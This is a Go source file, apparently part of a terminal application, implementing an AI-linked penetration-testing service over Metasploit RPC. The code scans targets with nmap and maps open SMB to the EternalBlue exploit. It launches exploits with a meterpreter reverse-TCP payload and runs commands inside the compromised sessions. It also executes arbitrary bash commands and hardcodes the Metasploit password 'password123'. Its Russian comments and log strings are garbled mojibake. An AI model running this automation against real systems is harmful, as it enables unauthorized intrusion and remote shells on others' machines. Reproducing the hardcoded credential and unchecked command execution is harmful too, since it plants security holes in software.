// Copyright 2025, Command Line Inc.
// SPDX-License-Identifier: Apache-2.0

package pentest

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/wavetermdev/waveterm/pkg/aiclient"
	"github.com/wavetermdev/waveterm/pkg/msfclient"
	"github.com/wavetermdev/waveterm/pkg/waveobj"
	"github.com/wavetermdev/waveterm/pkg/wcore"
)

// PentestService - —Å–µ—Ä–≤–∏—Å –¥–ª—è –ø–µ–Ω—Ç–µ—Å—Ç–∏–Ω–≥–∞ —Å AI
type PentestService struct {
	MSF *msfclient.MsfClient
	AI  *aiclient.ClaudeClient
}

// ScanResult - —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
type ScanResult struct {
	Target    string                 `json:"target"`
	ScanType  string                 `json:"scan_type"`
	Output    string                 `json:"output"`
	Timestamp string                 `json:"timestamp"`
	Ports     []map[string]interface{} `json:"ports,omitempty"`
}

// ExploitResult - —Ä–µ–∑—É–ª—å—Ç–∞—Ç —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏
type ExploitResult struct {
	Success   bool   `json:"success"`
	SessionID int    `json:"session_id,omitempty"`
	Target    string `json:"target"`
	Exploit   string `json:"exploit"`
	Message   string `json:"message"`
}

// NewPentestService —Å–æ–∑–¥–∞—ë—Ç –Ω–æ–≤—ã–π —Å–µ—Ä–≤–∏—Å –ø–µ–Ω—Ç–µ—Å—Ç–∏–Ω–≥–∞
func NewPentestService(msfHost string, msfPort int, aiAPIKey string) (*PentestService, error) {
	// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è MSF –∫–ª–∏–µ–Ω—Ç–∞
	msf := msfclient.NewMsfClient(msfHost, msfPort)
	err := msf.Authenticate("msf", "password123")
	if err != nil {
		return nil, fmt.Errorf("–æ—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ MSF: %w", err)
	}

	log.Printf("‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ Metasploit RPC")

	// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è AI –∫–ª–∏–µ–Ω—Ç–∞
	ai := aiclient.NewClaudeClient(aiAPIKey)

	return &PentestService{
		MSF: msf,
		AI:  ai,
	}, nil
}

// ScanTarget –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ü–µ–ª–∏
func (s *PentestService) ScanTarget(target string, scanType string) (*ScanResult, error) {
	log.Printf("üîç –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ü–µ–ª–∏: %s (—Ç–∏–ø: %s)", target, scanType)

	// –°–æ–∑–¥–∞—ë–º –∫–æ–Ω—Å–æ–ª—å MSF
	consoleResp, err := s.MSF.Call("console.create", []interface{}{})
	if err != nil {
		return nil, fmt.Errorf("–æ—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∫–æ–Ω—Å–æ–ª–∏: %w", err)
	}

	consoleData, ok := consoleResp.(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("–Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –æ—Ç–≤–µ—Ç–∞ –∫–æ–Ω—Å–æ–ª–∏")
	}

	consoleID := consoleData["id"].(string)
	defer s.MSF.Call("console.destroy", []interface{}{consoleID})

	// –§–æ—Ä–º–∏—Ä—É–µ–º –∫–æ–º–∞–Ω–¥—É nmap
	nmapFlags := "-sV"
	if scanType == "quick" {
		nmapFlags += " --top-ports 1000"
	} else if scanType == "stealth" {
		nmapFlags = "-sS " + nmapFlags
	}

	nmapCmd := fmt.Sprintf("db_nmap %s %s\n", nmapFlags, target)

	// –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ
	_, err = s.MSF.Call("console.write", []interface{}{consoleID, nmapCmd})
	if err != nil {
		return nil, fmt.Errorf("–æ—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: %w", err)
	}

	// –ñ–¥—ë–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∏ —Å–æ–±–∏—Ä–∞–µ–º –≤—ã–≤–æ–¥
	output := ""
	maxAttempts := 120 // 2 –º–∏–Ω—É—Ç—ã
	for i := 0; i < maxAttempts; i++ {
		time.Sleep(1 * time.Second)

		readResp, err := s.MSF.Call("console.read", []interface{}{consoleID})
		if err != nil {
			continue
		}

		if readData, ok := readResp.(map[string]interface{}); ok {
			if data, ok := readData["data"].(string); ok {
				output += data
			}

			// –ü—Ä–æ–≤–µ—Ä—è–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ
			if busy, ok := readData["busy"].(bool); ok && !busy {
				break
			}
			if busy, ok := readData["busy"].(string); ok && busy == "false" {
				break
			}
		}
	}

	result := &ScanResult{
		Target:    target,
		ScanType:  scanType,
		Output:    output,
		Timestamp: time.Now().Format(time.RFC3339),
	}

	// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
	analysis, err := s.AnalyzeScanResults(output)
	if err == nil {
		result.Ports = analysis["vulnerabilities"].([]map[string]interface{})
	}

	log.Printf("‚úÖ –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ")
	return result, nil
}

// ExploitTarget –≤—ã–ø–æ–ª–Ω—è–µ—Ç —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é —É—è–∑–≤–∏–º–æ—Å—Ç–∏
func (s *PentestService) ExploitTarget(target, exploitModule string, port int, lhost string) (*ExploitResult, error) {
	log.Printf("üéØ –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è: %s –Ω–∞ %s:%d", exploitModule, target, port)

	// –£–±–∏—Ä–∞–µ–º –ø—Ä–µ—Ñ–∏–∫—Å exploit/ –µ—Å–ª–∏ –µ—Å—Ç—å
	if len(exploitModule) > 8 && exploitModule[:8] == "exploit/" {
		exploitModule = exploitModule[8:]
	}

	// –ü–∞—Ä–∞–º–µ—Ç—Ä—ã —ç–∫—Å–ø–ª–æ–π—Ç–∞
	options := map[string]interface{}{
		"RHOSTS":  target,
		"RPORT":   port,
		"PAYLOAD": "windows/x64/meterpreter/reverse_tcp",
		"LHOST":   lhost,
		"LPORT":   4444,
	}

	// –ó–∞–ø—É—Å–∫–∞–µ–º —ç–∫—Å–ø–ª–æ–π—Ç
	_, err := s.MSF.Call("module.execute", []interface{}{"exploit", exploitModule, options})
	if err != nil {
		return &ExploitResult{
			Success: false,
			Target:  target,
			Exploit: exploitModule,
			Message: fmt.Sprintf("–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞: %v", err),
		}, nil
	}

	// –ñ–¥—ë–º —Å–æ–∑–¥–∞–Ω–∏—è —Å–µ—Å—Å–∏–∏
	time.Sleep(5 * time.Second)

	// –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–µ—Å—Å–∏–∏
	sessionsResp, err := s.MSF.Call("session.list", []interface{}{})
	if err != nil {
		return &ExploitResult{
			Success: false,
			Target:  target,
			Exploit: exploitModule,
			Message: "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ —Å–µ—Å—Å–∏–π",
		}, nil
	}

	sessions, ok := sessionsResp.(map[string]interface{})
	if !ok || len(sessions) == 0 {
		return &ExploitResult{
			Success: false,
			Target:  target,
			Exploit: exploitModule,
			Message: "–≠–∫—Å–ø–ª–æ–π—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω, –Ω–æ —Å–µ—Å—Å–∏—è –Ω–µ —Å–æ–∑–¥–∞–Ω–∞. –¶–µ–ª—å –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ —É—è–∑–≤–∏–º–∞.",
		}, nil
	}

	// –ò—â–µ–º —Å–µ—Å—Å–∏—é –¥–ª—è –Ω–∞—à–µ–π —Ü–µ–ª–∏
	for sessionID, sessionData := range sessions {
		if sessionInfo, ok := sessionData.(map[string]interface{}); ok {
			targetHost := ""
			if th, ok := sessionInfo["target_host"].(string); ok {
				targetHost = th
			} else if sh, ok := sessionInfo["session_host"].(string); ok {
				targetHost = sh
			}

			if targetHost == target {
				log.Printf("‚úÖ –°–µ—Å—Å–∏—è %s –æ—Ç–∫—Ä—ã—Ç–∞", sessionID)
				
				// –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º sessionID –≤ int
				var sessionIDInt int
				if sidFloat, ok := sessionInfo["id"].(float64); ok {
					sessionIDInt = int(sidFloat)
				} else {
					// sessionID –∏–∑ map —ç—Ç–æ —Å—Ç—Ä–æ–∫–∞, –ø–∞—Ä—Å–∏–º –µ—ë
					fmt.Sscanf(sessionID, "%d", &sessionIDInt)
				}
				
				return &ExploitResult{
					Success:   true,
					SessionID: sessionIDInt,
					Target:    target,
					Exploit:   exploitModule,
					Message:   fmt.Sprintf("–£—Å–ø–µ—à–Ω–æ! –û—Ç–∫—Ä—ã—Ç–∞ meterpreter —Å–µ—Å—Å–∏—è %d", sessionIDInt),
				}, nil
			}
		}
	}

	return &ExploitResult{
		Success: false,
		Target:  target,
		Exploit: exploitModule,
		Message: "–≠–∫—Å–ø–ª–æ–π—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω, –Ω–æ –Ω–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —Å–µ—Å—Å–∏—é –¥–ª—è —Ü–µ–ª–∏",
	}, nil
}

// ListSessions –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π
func (s *PentestService) ListSessions() (map[string]interface{}, error) {
	log.Printf("üìä –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —Å–µ—Å—Å–∏–π")

	sessionsResp, err := s.MSF.Call("session.list", []interface{}{})
	if err != nil {
		return nil, fmt.Errorf("–æ—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–µ—Å—Å–∏–π: %w", err)
	}

	sessions, ok := sessionsResp.(map[string]interface{})
	if !ok {
		return make(map[string]interface{}), nil
	}

	return sessions, nil
}

// RunSessionCommand –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É –≤ —Å–µ—Å—Å–∏–∏
func (s *PentestService) RunSessionCommand(sessionID int, command string) (interface{}, error) {
	log.Printf("‚ö° –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã –≤ —Å–µ—Å—Å–∏–∏ %d: %s", sessionID, command)

	// –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–µ—Å—Å–∏–∏
	sessions, err := s.ListSessions()
	if err != nil {
		return nil, err
	}

	sessionIDStr := fmt.Sprintf("%d", sessionID)
	sessionInfo, ok := sessions[sessionIDStr].(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("—Å–µ—Å—Å–∏—è %d –Ω–µ –Ω–∞–π–¥–µ–Ω–∞", sessionID)
	}

	sessionType := sessionInfo["type"].(string)

	// –í—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–∏–ø–∞ —Å–µ—Å—Å–∏–∏
	if sessionType == "meterpreter" {
		return s.MSF.Call("session.meterpreter_run_single", []interface{}{sessionID, command})
	} else {
		// Shell —Å–µ—Å—Å–∏—è
		s.MSF.Call("session.shell_write", []interface{}{sessionID, command + "\n"})
		time.Sleep(2 * time.Second)
		return s.MSF.Call("session.shell_read", []interface{}{sessionID})
	}
}


// SearchExploits –∏—â–µ—Ç —ç–∫—Å–ø–ª–æ–π—Ç—ã –≤ –±–∞–∑–µ MSF
func (s *PentestService) SearchExploits(query string) (map[string]interface{}, error) {
	log.Printf("üîç –ü–æ–∏—Å–∫ —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤: %s", query)

	// –í—ã–∑—ã–≤–∞–µ–º MSF RPC –¥–ª—è –ø–æ–∏—Å–∫–∞ –º–æ–¥—É–ª–µ–π
	result, err := s.MSF.Call("module.search", []interface{}{query})
	if err != nil {
		return nil, fmt.Errorf("–æ—à–∏–±–∫–∞ –ø–æ–∏—Å–∫–∞: %w", err)
	}

	modules, ok := result.(map[string]interface{})
	if !ok {
		return map[string]interface{}{
			"query":    query,
			"exploits": []interface{}{},
			"count":    0,
		}, nil
	}

	// –§–∏–ª—å—Ç—Ä—É–µ–º —Ç–æ–ª—å–∫–æ —ç–∫—Å–ø–ª–æ–π—Ç—ã
	exploits := make([]map[string]interface{}, 0)
	for name, info := range modules {
		if len(name) > 8 && name[:8] == "exploit/" {
			infoMap, ok := info.(map[string]interface{})
			if !ok {
				continue
			}

			exploit := map[string]interface{}{
				"name":        name,
				"description": infoMap["description"],
				"rank":        infoMap["rank"],
			}

			// –î–æ–±–∞–≤–ª—è–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –µ—Å–ª–∏ –µ—Å—Ç—å
			if disclosure, ok := infoMap["disclosure_date"]; ok {
				exploit["disclosure_date"] = disclosure
			}
			if references, ok := infoMap["references"]; ok {
				exploit["references"] = references
			}

			exploits = append(exploits, exploit)
		}
	}

	log.Printf("‚úÖ –ù–∞–π–¥–µ–Ω–æ —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤: %d", len(exploits))

	return map[string]interface{}{
		"query":    query,
		"exploits": exploits,
		"count":    len(exploits),
	}, nil
}


// AnalyzeScanResults –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∏ –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç —ç–∫—Å–ø–ª–æ–π—Ç—ã
func (s *PentestService) AnalyzeScanResults(scanOutput string) (map[string]interface{}, error) {
	log.Printf("üî¨ –ê–Ω–∞–ª–∏–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è")

	vulnerabilities := make([]map[string]interface{}, 0)

	// –ü–∞—Ä—Å–∏–º –≤—ã–≤–æ–¥ nmap –¥–ª—è –ø–æ–∏—Å–∫–∞ –∏–∑–≤–µ—Å—Ç–Ω—ã—Ö —É—è–∑–≤–∏–º—ã—Ö —Å–µ—Ä–≤–∏—Å–æ–≤
	lines := strings.Split(scanOutput, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		// –ò—â–µ–º SMB (MS17-010)
		if strings.Contains(line, "445/tcp") && strings.Contains(line, "microsoft-ds") {
			vulnerabilities = append(vulnerabilities, map[string]interface{}{
				"port":        445,
				"service":     "SMB",
				"cve":         "MS17-010",
				"exploit":     "exploit/windows/smb/ms17_010_eternalblue",
				"severity":    "critical",
				"description": "EternalBlue - –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å SMB",
			})
		}

		// –ò—â–µ–º SSH
		if strings.Contains(line, "22/tcp") && strings.Contains(line, "ssh") {
			vulnerabilities = append(vulnerabilities, map[string]interface{}{
				"port":        22,
				"service":     "SSH",
				"exploit":     "auxiliary/scanner/ssh/ssh_login",
				"severity":    "medium",
				"description": "SSH - –≤–æ–∑–º–æ–∂–µ–Ω –±—Ä—É—Ç—Ñ–æ—Ä—Å",
			})
		}

		// –ò—â–µ–º HTTP/HTTPS
		if (strings.Contains(line, "80/tcp") || strings.Contains(line, "443/tcp")) && 
		   (strings.Contains(line, "http") || strings.Contains(line, "https")) {
			vulnerabilities = append(vulnerabilities, map[string]interface{}{
				"port":        80,
				"service":     "HTTP",
				"severity":    "info",
				"description": "Web —Å–µ—Ä–≤–µ—Ä - —Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ",
			})
		}
	}

	return map[string]interface{}{
		"vulnerabilities": vulnerabilities,
		"count":           len(vulnerabilities),
		"recommendations": s.generateRecommendations(vulnerabilities),
	}, nil
}

func (s *PentestService) generateRecommendations(vulns []map[string]interface{}) []string {
	recommendations := make([]string, 0)

	for _, vuln := range vulns {
		if exploit, ok := vuln["exploit"].(string); ok {
			recommendations = append(recommendations, 
				fmt.Sprintf("–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —ç–∫—Å–ø–ª–æ–π—Ç: %s –¥–ª—è %s", exploit, vuln["service"]))
		}
	}

	return recommendations
}

// ReadFile —á–∏—Ç–∞–µ—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞
func (s *PentestService) ReadFile(path string) (string, error) {
	content, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("–æ—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞: %w", err)
	}
	log.Printf("üìñ –ü—Ä–æ—á–∏—Ç–∞–Ω —Ñ–∞–π–ª: %s (%d –±–∞–π—Ç)", path, len(content))
	return string(content), nil
}

// WriteFile —Å–æ–∑–¥–∞—ë—Ç –∏–ª–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç —Ñ–∞–π–ª
func (s *PentestService) WriteFile(path, content string) error {
	err := os.WriteFile(path, []byte(content), 0644)
	if err != nil {
		return fmt.Errorf("–æ—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ —Ñ–∞–π–ª–∞: %w", err)
	}
	log.Printf("üíæ –ó–∞–ø–∏—Å–∞–Ω —Ñ–∞–π–ª: %s (%d –±–∞–π—Ç)", path, len(content))
	return nil
}

// EditFile —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ—Ç —Ñ–∞–π–ª (–∑–∞–º–µ–Ω–∞ —Ç–µ–∫—Å—Ç–∞)
func (s *PentestService) EditFile(path, oldText, newText string) error {
	content, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("–æ—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞: %w", err)
	}
	
	if !strings.Contains(string(content), oldText) {
		return fmt.Errorf("—Ç–µ–∫—Å—Ç –¥–ª—è –∑–∞–º–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ —Ñ–∞–π–ª–µ")
	}
	
	newContent := strings.Replace(string(content), oldText, newText, -1)
	err = os.WriteFile(path, []byte(newContent), 0644)
	if err != nil {
		return fmt.Errorf("–æ—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ —Ñ–∞–π–ª–∞: %w", err)
	}
	
	log.Printf("‚úèÔ∏è  –û—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω —Ñ–∞–π–ª: %s", path)
	return nil
}

// ExecuteCommand –≤—ã–ø–æ–ª–Ω—è–µ—Ç bash –∫–æ–º–∞–Ω–¥—É
func (s *PentestService) ExecuteCommand(command string) (string, error) {
	log.Printf("‚ö° –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã: %s", command)
	
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	
	if err != nil {
		return string(output), fmt.Errorf("–æ—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: %w", err)
	}
	
	log.Printf("‚úÖ –ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ")
	return string(output), nil
}

// OpenBrowser –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç URL –≤ –±—Ä–∞—É–∑–µ—Ä–µ –≤–∏–¥–∂–µ—Ç–µ
func (s *PentestService) OpenBrowser(ctx context.Context, tabId, url string) (string, error) {
	log.Printf("üåê –û—Ç–∫—Ä—ã—Ç–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞: %s", url)
	
	blockDef := &waveobj.BlockDef{
		Meta: map[string]interface{}{
			"view": "web",
			"url":  url,
		},
	}
	
	block, err := wcore.CreateBlock(ctx, tabId, blockDef, nil)
	if err != nil {
		return "", fmt.Errorf("–æ—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞: %w", err)
	}
	
	log.Printf("‚úÖ –ë—Ä–∞—É–∑–µ—Ä –æ—Ç–∫—Ä—ã—Ç: %s", block.OID)
	return block.OID, nil
}

// CreateTerminal —Å–æ–∑–¥–∞—ë—Ç –Ω–æ–≤—ã–π —Ç–µ—Ä–º–∏–Ω–∞–ª –≤–∏–¥–∂–µ—Ç
func (s *PentestService) CreateTerminal(ctx context.Context, tabId, command string) (string, error) {
	log.Printf("üíª –°–æ–∑–¥–∞–Ω–∏–µ —Ç–µ—Ä–º–∏–Ω–∞–ª–∞")
	
	blockDef := &waveobj.BlockDef{
		Meta: map[string]interface{}{
			"view": "term",
		},
	}
	
	if command != "" {
		blockDef.Meta["cmd"] = command
	}
	
	block, err := wcore.CreateBlock(ctx, tabId, blockDef, nil)
	if err != nil {
		return "", fmt.Errorf("–æ—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Ç–µ—Ä–º–∏–Ω–∞–ª–∞: %w", err)
	}
	
	log.Printf("‚úÖ –¢–µ—Ä–º–∏–Ω–∞–ª —Å–æ–∑–¥–∞–Ω: %s", block.OID)
	return block.OID, nil
}

// OpenPreview –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Ñ–∞–π–ª –≤ preview –≤–∏–¥–∂–µ—Ç–µ
func (s *PentestService) OpenPreview(ctx context.Context, tabId, path string) (string, error) {
	log.Printf("üìÑ –û—Ç–∫—Ä—ã—Ç–∏–µ preview: %s", path)
	
	blockDef := &waveobj.BlockDef{
		Meta: map[string]interface{}{
			"view": "preview",
			"file": path,
		},
	}
	
	block, err := wcore.CreateBlock(ctx, tabId, blockDef, nil)
	if err != nil {
		return "", fmt.Errorf("–æ—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è preview: %w", err)
	}
	
	log.Printf("‚úÖ Preview –æ—Ç–∫—Ä—ã—Ç: %s", block.OID)
	return block.OID, nil
}
